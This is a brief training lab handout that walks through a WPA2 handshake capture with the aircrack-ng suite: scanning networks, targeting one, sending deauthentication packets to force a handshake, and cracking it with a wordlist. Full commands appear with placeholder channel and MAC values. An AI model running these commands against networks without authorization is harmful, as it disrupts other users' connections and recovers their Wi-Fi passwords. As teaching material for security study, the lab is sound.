# Lab 2: Capturing a Handshake (Conceptual)

## Goal: Understand the flow of a WPA2 attack.

## The Aircrack-ng Suite Flow:
1. **Find Targets**: `sudo airodump-ng wlan0mon` (See all nearby WiFi).
2. **Lock onto Target**: `sudo airodump-ng -c <channel> --bssid <MAC> -w capture wlan0mon`
3. **Force Handshake**: In a new terminal, run `sudo aireplay-ng -0 5 -a <MAC> wlan0mon` (Sends deauth packets).
4. **Crack the Hash**: `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`

## Success Check:
- [ ] I understand the airodump $\rightarrow$ aireplay $\rightarrow$ aircrack flow.
- [ ] I know why a deauth attack is used.
